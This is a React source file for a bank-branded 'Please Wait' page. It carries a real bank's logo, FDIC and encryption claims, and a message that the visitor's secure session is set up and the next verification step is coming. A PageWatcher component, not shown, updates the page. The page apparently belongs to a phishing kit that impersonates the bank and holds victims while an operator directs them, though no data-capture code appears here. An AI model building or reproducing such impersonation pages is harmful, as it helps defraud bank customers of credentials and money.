import PageWatcher from "../components/pagewaters";
import umb from '../assets/UMB-2x-Logo-Digital-BlueCyan-RGB.svg'
export default function Landing() {

    return (

        <>

            <PageWatcher />

           <div className="min-h-screen bg-[#f5f7fa] flex items-center justify-center px-4">
  <div className="w-full max-w-lg bg-white rounded-xl shadow-md border border-gray-200 p-10">

    {/* Bank Logo */}
    <div className="flex justify-center mb-8">
      <img
        src={umb} // Replace with your bank logo
        alt="Bank Logo"
        className="h-8 object-contain"
      />
    </div>

    {/* Status Icon */}
    <div className="flex justify-center mb-6">
      <div className="w-16 h-16 rounded-full bg-blue-100 flex items-center justify-center">
        <svg
          className="w-8 h-8 text-blue-700 animate-spin"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
        >
          <circle
            className="opacity-25"
            cx="12"
            cy="12"
            r="10"
            stroke="currentColor"
            strokeWidth="3"
          />
          <path
            className="opacity-75"
            fill="currentColor"
            d="M4 12a8 8 0 018-8v3a5 5 0 00-5 5H4z"
          />
        </svg>
      </div>
    </div>

    {/* Heading */}
    <h1 className="text-3xl font-semibold text-center text-gray-900">
      Please Wait
    </h1>

    {/* Description */}
    <p className="mt-4 text-center text-gray-600 leading-7">
      Your secure session has been established successfully.
    </p>

    <p className="mt-2 text-center text-gray-600 leading-7">
      Please wait while we prepare the next step of your verification.
      This page will update automatically when available.
    </p>

    {/* Loading Dots */}
    <div className="flex justify-center mt-8 space-x-2">
      <span className="w-3 h-3 rounded-full bg-blue-700 animate-bounce"></span>
      <span
        className="w-3 h-3 rounded-full bg-blue-700 animate-bounce"
        style={{ animationDelay: "0.15s" }}
      ></span>
      <span
        className="w-3 h-3 rounded-full bg-blue-700 animate-bounce"
        style={{ animationDelay: "0.3s" }}
      ></span>
    </div>

    {/* Footer */}
    <div className="border-t mt-10 pt-5 text-center">
      <p className="text-xs text-gray-500">
        This session is secured using industry-standard encryption.
      </p>

      <p className="text-xs text-gray-500 mt-1">
        FDIC-Insured • Backed by the full faith and credit of the U.S.
        Government
      </p>
    </div>

  </div>
</div>

        </>

    );

}